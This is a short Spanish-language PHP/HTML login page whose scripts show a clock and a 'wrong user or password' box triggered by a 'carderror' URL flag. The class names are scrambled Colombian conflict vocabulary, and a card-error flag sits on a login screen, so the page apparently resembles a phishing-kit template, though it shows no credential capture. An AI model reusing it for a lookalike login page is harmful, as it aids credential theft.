<!-- Fuente utilizada: Open Sans por Steve Matteson (Apache License 2.0) -->
<!DOCTYPE html>
<html lang="es">
 <?php require_once("head.php"); ?>
<body>
<div class="container">
    <div class="row">
      <div class="col">
        <img src="./img/logo.svg" alt="Logo" class="logo">
        <h2 id="texto" class="procesodepazcolombia"></h2>
        <p id="currentDateTime" class="dateTime"></p>
        <h3 class="grotesca-papel">Inicio de sesion</h3>
        <div class="random" style="padding-top: 30px;"></div>
        
        <div class="desmovilizacion" id="err-mensaje" style="display:none">
  <img src="./img/error.jpg" alt="" class="error-paracos">
  <div class="error-content">
    <h3 class="error-guerrilas">Error</h3>
    <p class="error-interno">Por favor ingrese la información requerida</p>
  </div>
</div>

<div class="desmovilizacion" id="carderror" style="display:none">
  <img src="./img/error.jpg" alt="" class="error-paracos">
  <div class="error-content">
    <h3 class="error-guerrilas">Error</h3>
    <p class="error-interno">Usuario o clave incorrecta</p>
  </div>
</div>
<script>
      function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    window.addEventListener('DOMContentLoaded', function() {
        var cardErrorParam = getParameterByName('carderror');
        if (cardErrorParam === 'true') {
            var cardErrorElement = document.getElementById('carderror');
            if (cardErrorElement) {
                cardErrorElement.style.display = 'flex'; 

                var inputs = document.querySelectorAll('.camionescolombia');
                inputs.forEach(function(input) {
                    input.style.borderColor = 'red'; 
                });
            }
        }
    });

    function getCurrentDateTime() {
      const now = new Date();
      const options = { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
      const formattedDate = now.toLocaleString('es-CO', options);
      return formattedDate;
    }

    function updateDateTime() {
      const dateTimeElement = document.getElementById('currentDateTime');
      const dateTimeString = getCurrentDateTime();
      const message = "Fecha y hora actual:";
      const separatedMessage = message + "&nbsp;&nbsp;&nbsp;&nbsp;" + dateTimeString;
      dateTimeElement.innerHTML = separatedMessage;
    }

    setInterval(updateDateTime, 1000);  
</script>